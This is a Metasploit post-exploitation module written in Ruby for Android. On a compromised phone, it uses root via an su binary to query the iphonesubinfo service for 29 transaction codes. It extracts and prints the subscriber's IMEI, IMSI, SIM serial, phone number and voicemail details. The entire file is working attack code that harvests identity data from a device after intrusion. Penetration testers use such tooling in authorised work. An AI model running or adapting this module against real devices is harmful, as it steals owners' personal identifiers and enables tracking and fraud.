##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  include Msf::Post::Common
  include Msf::Post::Android::Priv
  include Msf::Post::Android::System

  def initialize(info={})
    super( update_info( info, {
        'Name'          => "extracts subscriber info from target device",
        'Description'   => %q{
            This module displays the subscriber info stored on the target phone. 
            It uses call service to get values of each transaction code like imei etc.
        },
        'License'       => MSF_LICENSE,
        'Author'        => ['Auxilus'],
        'SessionTypes'  => [ 'meterpreter', 'shell' ],
        'Platform'       => 'android',
      }
    ))
    register_options([
      OptString.new('SU_BINARY', [true, 'The su binary to execute root commands', 'su'])
    ])
  end

  def run
    @transaction_codes ||= [
      'DeviceId',
      'DeviceIdForSubscriber',
      'ImeiForSubscriber',
      'DeviceSvn',
      'SubscriberId',
      'SubscriberIdForSubscriber',
      'GroupIdLevel1',
      'GroupIdLevel1ForSubscriber',
      'IccSerialNumber',
      'IccSerialNumberForSubscriber',
      'Line1Number',
      'Line1NumberForSubscriber',
      'Line1AlphaTag',
      'Line1AlphaTagForSubscriber',
      'Msisdn',
      'MsisdnForSubscriber',
      'VoiceMailNumber',
      'VoiceMailNumberForSubscriber',
      'CompleteVoiceMailNumber',
      'CompleteVoiceMailNumberForSubscriber',
      'VoiceMailAlphaTag',
      'VoiceMailAlphaTagForSubscriber',
      'IsimImpi',
      'IsimDomain',
      'IsimImpu',
      'IsimIst',
      'IsimPcscf',
      'IsimChallengeResponse',
      'IccSimChallengeResponse'
  ]
    values ||= []
    arr ||= []
    for code in 1..29 do
      print_status("using code : #{code}")
      block = su_exec("service call iphonesubinfo #{code}", datastore['SU_BINARY'])
      value,tc = get_val(block, code)
      arr << [tc, value]
    end

    tc_tbl = Rex::Text::Table.new(
      'Header'  => 'Wireless APs',
      'Indent'  => 1,
      'Columns' => ['transaction code', 'value']
    )

    arr.each do |a|
      tc_tbl << [
        a[0],     #  TRANSACTION CODE
        a[1]      #  value
      ]
    end
    print_line(tc_tbl.to_s)
  end

  def get_val(data, code)
    parsed = data.gsub(/Parcel/, '')
    string = ''
    100.times do |i|
      next if i % 2 == 0
      str = parsed.split("'")[i]
      if str.nil?
        break
      end
      string += str
    end
    imei = ''
    string.split(".").each do |chr|
      next if chr.nil? or chr == "\n"
      imei += chr
    end
    return imei,@transaction_codes[code-1]
  end
end
